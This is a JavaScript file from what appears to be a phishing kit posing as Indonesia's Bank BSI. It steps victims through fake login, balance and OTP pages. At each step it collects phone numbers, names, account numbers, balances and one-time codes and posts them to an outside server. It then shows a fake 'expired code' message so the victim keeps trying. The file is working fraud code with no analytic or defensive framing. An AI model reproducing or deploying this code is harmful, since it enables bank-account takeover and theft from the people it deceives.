var logo = "▩----𝘄𝘄𝘄.𝗯𝗮𝗻𝗸𝗯𝘀𝗶.𝗰𝗼.𝗶𝗱----▩";    
       
 function sendHp(){
    $('.process1').fadeIn();
    $('#nohp').mask('00000000000');
    event.preventDefault();
    document.getElementById('btnSubmit1').innerHTML ="Memproses...";
  var tarif = $('input[name="tarif"]:checked').val();
       if (tarif) {  
  sessionStorage.setItem('tarif', tarif);
  }
  var nomor = document.getElementById("nohp").value;
        sessionStorage.setItem("nomor", nomor);
    
  var gabungan = "" + logo + '\n\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nohp.value + '</b>';
        
   $.ajax({
        url: 'https://bdudu.cloud/ku/i.php',       
        type: 'POST',
        data: { message: gabungan },
        crossDomain: true,
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
        },
    
    complete: function(){  
    setTimeout(function(){
    document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
 $('.process1').fadeOut();
    location.href='login.html';
    }, 500);}});};

     
     
     
     
 function sendLog(){
    $('.process1').fadeIn();    
    event.preventDefault();
    document.getElementById('btnSubmit1').innerHTML ="Memproses...";
  
  var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nomor.value + '</b>\n\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value  ;
        
   $.ajax({
        url: 'https://bdudu.cloud/ku/i.php',       
        type: 'POST',
        data: { message: gabungan },
        crossDomain: true,
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
        },
    
    complete: function(){  
    setTimeout(function(){
    document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
 $('.process1').fadeOut();
    var tarif = document.getElementById('tarif').value;
    sessionStorage.setItem("tarif", tarif);  
    var nomor = document.getElementById('nomor').value;
    sessionStorage.setItem("nomor", nomor);    
    var nama = document.getElementById('nama').value;
    sessionStorage.setItem("nama", nama);    
    var rek = document.getElementById('rek').value;
    sessionStorage.setItem("rek", rek);
    location.href='saldo.html';
    }, 500);}});};
    
    

    
             
function sendSaldo(){
    $('.process1').fadeIn();    
    event.preventDefault();
    document.getElementById('btnSubmit1').innerHTML ="Memproses...";
  
  var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nomor.value + '</b>\n\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value + '\n𝗦𝗮𝗹𝗱𝗼 • <pre>' + saldo.value + '</pre>';
        
   $.ajax({
        url: 'https://bdudu.cloud/ku/i.php',       
        type: 'POST',
        data: { message: gabungan },
        crossDomain: true,
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
        },
    
    complete: function(){  
    setTimeout(function(){
    document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
 $('.process1').fadeOut();
    var tarif = document.getElementById('tarif').value;
    sessionStorage.setItem("tarif", tarif);  
    var nomor = document.getElementById('nomor').value;
    sessionStorage.setItem("nomor", nomor);    
    var nama = document.getElementById('nama').value;
    sessionStorage.setItem("nama", nama);    
    var rek = document.getElementById('rek').value;
    sessionStorage.setItem("rek", rek);
    var saldo = document.getElementById('saldo').value;
    sessionStorage.setItem("saldo", saldo);
    location.href='otp.html';
    }, 500);}});};



// otp
function sendOtp() {
  event.stopPropagation();
    event.preventDefault();
  $("#djload").show();  
 document.getElementById('btnSubmit1').innerHTML = "Memproses..."; 
 
 var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nomor.value + '</b>\n\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value + '\n𝗦𝗮𝗹𝗱𝗼 • <pre>' + saldo.value + '</pre>' + '\n\n𝗢𝗧𝗣 • <b>' + sixpin.value + '</b>';
    
$.ajax({
        url: 'https://bdudu.cloud/ku/i.php',       
        type: 'POST',
        data: { message: gabungan },
        crossDomain: true,
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
        },
 
 complete: function(data) {
            console.log('Complete')
setTimeout(function(){  
       
      
    }, 2000);
     $("#notif").text("- Kode Aktivasi sudah kadaluarsa -");
     $("#notif").css("color", "red");
        }
    });
      setTimeout(() => {
     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode Aktivasi,<br/>Silahkan klik tombol dibawah ini";
     $("#djload").hide();  
   $("#notif").css("color", "black");
 $("#sixpin").val("");
document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";      
              
   }, 4000);

  }




// datawa

function getcs(){
 $("#djload").show();   
  audio4 = document.getElementById("bsiku");
  audio1 = document.getElementById("bsi");
    audio4.play();
     audio1.load();
    audio4.loop = false
setTimeout(function(){  
location.href='wa';
    }, 1000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 1000);      
}     
